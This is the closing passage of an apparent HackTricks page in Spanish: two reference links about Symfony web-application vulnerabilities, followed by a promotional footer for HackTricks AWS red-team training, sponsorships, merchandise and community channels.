* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
